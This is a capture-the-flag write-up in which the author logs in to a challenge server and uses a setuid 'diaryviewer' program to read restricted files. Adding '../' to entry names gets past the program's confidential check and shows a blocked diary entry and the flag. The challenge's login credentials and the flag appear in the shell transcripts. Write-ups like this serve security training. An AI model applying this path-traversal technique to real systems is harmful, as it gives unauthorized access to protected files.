diary
200
Some people are way too revealing about their personal lives.

ssh ctf@ctf.dart.com.sg -p 2300

Password: fykqkgjlit

```sh
┌──(razali㉿razali)-[~]
└─$ ssh ctf@192.168.40.199 -p 2300 
The authenticity of host '[192.168.40.199]:2300 ([192.168.40.199]:2300)' can't be established.
ECDSA key fingerprint is SHA256:mzSGxnkaYOd3DJsJcnTrK6iuqzawg5Z1hjgcbkY5V2M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.40.199]:2300' (ECDSA) to the list of known hosts.
ctf@192.168.40.199's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf@diary:~$ pwd
/home/ctf
ctf@diary:~$ ls
ctf@diary:~$ cd ..
ctf@diary:/home$ ls
creed  ctf
ctf@diary:/home$ 
ctf@diary:/home$ ll
total 20
drwxr-xr-x 1 root  root  4096 Jun 29 05:19 ./
drwxr-xr-x 1 root  root  4096 Jul 11 13:21 ../
drwxr-xr-x 1 creed creed 4096 Jun 29 05:19 creed/
drwxr-xr-x 1 ctf   ctf   4096 Jul 11 13:21 ctf/
ctf@diary:/home$ cd creed/
ctf@diary:/home/creed$ ll
total 32
drwxr-xr-x 1 creed creed 4096 Jun 29 05:19 ./
drwxr-xr-x 1 root  root  4096 Jun 29 05:19 ../
-rw-r--r-- 1 creed creed  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 creed creed 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 creed creed  807 Apr  4  2018 .profile
drwxr-xr-x 1 creed creed 4096 Jun 29 05:19 diary_entries/
-rwxrwx--- 1 creed creed   44 Jun  1 14:14 flag.txt*
ctf@diary:/home/creed$ cat flag.txt 
cat: flag.txt: Permission denied
ctf@diary:/home/creed$ cd diary_entries/
ctf@diary:/home/creed/diary_entries$ ll
total 44
drwxr-xr-x 1 creed creed 4096 Jun 29 05:19 ./
drwxr-xr-x 1 creed creed 4096 Jun 29 05:19 ../
-rwxrwx--- 1 creed creed 2321 Jun  1 14:14 07082008.txt*
-rwxrwx--- 1 creed creed 1825 Jun  1 14:14 09032015.txt*
-rwxrwx--- 1 creed creed 1622 Jun  1 14:14 12062010.txt*
-rwxrwx--- 1 creed creed 2598 Jun  1 14:14 13012021.txt*
-rwxrwx--- 1 creed creed 2289 Jun  1 14:14 17042017.txt*
-rwxrwx--- 1 creed creed 1307 Jun  1 14:14 20042004.txt*
-rwxrwx--- 1 creed creed 2070 Jun  1 14:14 22052019.txt*
-rwxrwx--- 1 creed creed 2445 Jun  1 14:14 28082020.txt*
-rwxrwxr-- 1 creed creed   17 Jun  1 14:14 confidential_entries.txt*
ctf@diary:/home/creed/diary_entries$ cat confidential_entries.txt 
28082020
13012021 
ctf@diary:/home/creed/diary_entries$ cat 07082008.txt 
cat: 07082008.txt: Permission denied
ctf@diary:/home/creed/diary_entries$ cat 28082020.txt 
cat: 28082020.txt: Permission denied
ctf@diary:/home/creed/diary_entries$ cd /usr/bin/
ctf@diary:/usr/bin$ ll
total 31160
drwxr-xr-x 1 root  root      4096 Jun 29 05:19  ./
drwxr-xr-x 1 root  root      4096 May 12 23:06  ../
-rwxr-xr-x 1 root  root     54772 Jan 18  2018 '['*
-rwxr-xr-x 1 root  root     21920 Sep 16  2020  addpart*
-rwxr-xr-x 1 root  root     13732 Mar 12 13:09  apt*
-rwxr-xr-x 1 root  root     83420 Mar 12 13:09  apt-cache*
-rwxr-xr-x 1 root  root     21980 Mar 12 13:09  apt-cdrom*
-rwxr-xr-x 1 root  root     21924 Mar 12 13:09  apt-config*
-rwxr-xr-x 1 root  root     42460 Mar 12 13:09  apt-get*
-rwxr-xr-x 1 root  root     27391 Mar 12 13:09  apt-key*
--------------OMITTED---------------------------------
-rwsrwxr-x 1 creed creed    16920 Jun 29 05:19  diaryviewer*
--------------OMITTED---------------------------------


```

```sh
ctf@diary:~$ cd ~/../creed/diary_entries/
ctf@diary:/home/creed/diary_entries$ ls
07082008.txt  12062010.txt  17042017.txt  22052019.txt  confidential_entries.txt
09032015.txt  13012021.txt  20042004.txt  28082020.txt
ctf@diary:/home/creed/diary_entries$ diaryviewer 07082008.txt 
Not confidential, proceeding to display
Failed to open diary entry, does it exist?
Available diary entries:
07082008
09032015
12062010
13012021
17042017
20042004
22052019
28082020
ctf@diary:/home/creed/diary_entries$ diaryviewer 07082008
Not confidential, proceeding to display
Requested diary entry:
==========
We’re having a party at work tomorrow to celebrate “08/08/08 Day,” which is great because I’ll be able to eat enough that I won’t have to buy food for a week. That’s my favorite part about work parties – they end up saving me a lot of moolah in the long run. I wish they were more fun, though. If I was in charge, we’d be rocking and rolling all night. My parties would go down in history as the best work parties of all time. Here’s a rundown of my perfect party:

We’d start out with a bang, and by that I mean I’d fire off a starter’s pistol so people knew the party actually started. The very first event of the party would be Bobbing for Creed Shots. I’d fill a large kiddie pool with Creed Juice -- a mixture of kool-aid, Pop Rocks, and grain alcohol -- and throw some shot glasses in there. Then everyone has to lean in, grab a shot glass with their mouths, and take the shot. It’s messy but it sure gets things started right. If you’re not drunk after Bobbing for Creed Shots, you’re not playing right.

So after everyone’s good and sauced up, I’d break out the piñatas. The key to piñatas at parties is naming them. If you name them after co-workers, you know people are going to really get into it. I’m not so great with names, so I’d let somebody else do the naming, but trust me, they would all be named. As for filling them, that all depends on the budget. If there’s no dinero for the piñatas, then I’d fill them with dry rice. If there’s a little cash around, then I’d go for hard candy. With hard candy, you get the fun of seeing the piñata burst AND the injuries that go with it.

After piñata time, we’d go straight into the eating contests. I’m partial to deviled eggs for quantity, but I know hot dogs are pretty popular these days, too. I’d compromise and make hot dog omelets for everyone to scarf down. I’m pretty sure I know who’d win, but you never can tell – sometimes the smallest accountants make the biggest eaters.

When the party winds down, I’d do another round of Bobbing for Creed Shots and then send people on their way with Goody Bags. The bags would just be filled with office supplies, but hey, everyone likes a parting gift, right?

They should really make me head of that party committee thing. I’d be amazing.


```
```sh
ctf@diary:/home/creed/diary_entries$ cat confidential_entries.txt 
28082020
13012021
ctf@diary:/home/creed/diary_entries$ diaryviewer 28082020
You have requested a confidential diary entry. Can not share it with you...

```



```sh
D:\My Documents\Writeups\Reversing\CTF\Ivy Finals\Linux\diary 2>scp -P 2300 ctf@192.168.40.199:/usr/bin/diaryviewer .
ctf@192.168.40.199's password:
diaryviewer                                                                           100%   17KB 231.9KB/s   00:00
```
  
```sh
ctf@diary:/home/creed/diary_entries$ diaryviewer ../diary_entries/28082020
Not confidential, proceeding to display
Requested diary entry:
==========
Boy do I have a story to tell. You know how I was keeping track of Michael’s safe combo? Well it finally came in handy. I was trolling around the office last night after hours and heard some noise coming from the boss’s room. Normally the office is real quiet at night, which is why I stick around in the first place. Quiet is like a drug to me and if I don’t get my fix every night, I start to get the shakes.

So anyway, I heard these noises and got freaked out that the bossman was using his office for a little nighttime nooky with that new chick that sits in Tony’s seat every day. Not wanting to get caught, I dropped down and started to army crawl over to investigate (I got a Private Investigator license so I’m allowed to investigate anything I want, suckers). As luck would have it, there wasn’t anybody in there. Turns out that the noise was coming from inside Michael’s big furniture cabinet thing. So I opened the cabinet door, half expecting a cat to jump out at me. Usually when I open cabinets or closets or anything, cats end up pouncing on me. For some reason, cats find me very attractive.

Nothing jumped out at me, but I could hear the rustling pretty close to the ground, so I bent over and figured out that it was coming from the safe. For a second, I just stared at it, wondering what could be inside. Then I realized that I had been saving up Michael’s safe combo for this very occasion. Well, this occasion and whenever I needed some cash, but that’s beside the point.

I went over to my computer and looked back at my previous entries of this thing. Apparently I wasn’t too good with my record keeping because the numbers were kind of off. I ended up trying out every combo I wrote down and you know what? I didn’t get it right until the very last one I tried. The good news is, I got it open and you’ll never guess what was inside.

No, it wasn’t a cat, smart ass. It was a squirrel! I don’t know for the life of me why that guy had a squirrel in his safe, but I do know that I got me a new pet. And I’m going to train it. Right now I’m calling it Butthead, but I’m open to suggestions for new names if you got any. In just a few months, I’m going to have the best trained squirrel in Pennsylvania. I’m also going to blackmail Michael because I’m pretty sure it’s against the law to lock a squirrel in a safe. False imprisonment or something.

Everything’s coming up Creed!
ctf@diary:/home/creed/diary_entries$ diaryviewer ../flag.txt
Not confidential, proceeding to display
Failed to open diary entry, does it exist?
Available diary entries:
07082008
09032015
12062010
13012021
17042017
20042004
22052019
28082020
ctf@diary:/home/creed/diary_entries$ diaryviewer ../flag
Not confidential, proceeding to display
Requested diary entry:
==========
ivyctf{dear_diary_is_better_than_deer_dairy}

```

